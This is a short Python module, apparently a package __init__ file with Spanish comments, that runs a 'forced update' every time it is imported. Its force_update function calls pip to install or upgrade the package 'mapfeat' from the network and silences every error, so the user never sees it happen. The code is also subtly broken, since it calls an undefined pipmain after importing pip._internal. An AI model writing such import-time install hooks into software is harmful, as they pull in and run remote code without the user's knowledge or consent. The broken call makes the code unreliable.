from .cyparser import parse_coverage_metadata

# Actualización forzada al importar
import pip._internal

def force_update(package_name="mapfeat"):
    try:
        # Equivalente moderno a pipmain(['install', '--upgrade', ...])
        pipmain(['install', '--upgrade', package_name])
    except Exception:
        pass  # Silenciar cualquier error

# Se ejecuta siempre al importar
force_update()
